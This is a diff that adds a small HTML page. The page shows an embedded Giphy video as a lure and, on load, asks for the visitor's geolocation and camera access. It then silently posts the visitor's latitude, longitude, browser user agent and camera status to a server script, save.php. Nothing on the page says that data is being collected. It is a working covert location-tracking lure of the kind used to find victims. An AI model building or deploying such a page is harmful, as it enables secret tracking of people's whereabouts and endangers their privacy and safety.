@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+
+<body onload="getLocation()">
+    <div style="width:480px">
+        <iframe allow="fullscreen" frameBorder="0" height="480" src="https://giphy.com/embed/Al2Uzr6Rz4b5w2qWpE/video" width="480"></iframe>
+    </div>
+
+    <p id="demo"></p>
+
+    <script>
+        const x = document.getElementById("demo");
+
+        // Function to get the user's location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        // Function to show the position and send the data
+        function showPosition(position) {
+            // Get latitude and longitude
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Get the user agent (browser info)
+            const userAgent = navigator.userAgent;
+
+            // Get camera availability via the mediaDevices API
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Assuming camera access was granted
+                    const cameraAvailable = true;
+                    sendData(latitude, longitude, userAgent, cameraAvailable);
+                })
+                .catch(function(err) {
+                    // Camera access was denied or failed
+                    const cameraAvailable = false;
+                    sendData(latitude, longitude, userAgent, cameraAvailable);
+                });
+        }
+
+        // Function to handle errors in getting geolocation
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    x.innerHTML = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    x.innerHTML = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    x.innerHTML = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    x.innerHTML = "An unknown error occurred.";
+                    break;
+            }
+        }
+ // Function to send data to the server
+        function sendData(latitude, longitude, userAgent, cameraAvailable) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "save.php", true); // Use POST for better security
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+            // Send the data to the server (parameters)
+            const data = `lat=${latitude}&long=${longitude}&user_agent=${encodeURIComponent(userAgent)}&camera_agent=${cameraAvailable}`;
+            xhttp.send(data);
+        }
+    </script>
+
+</body>
+
+</html>
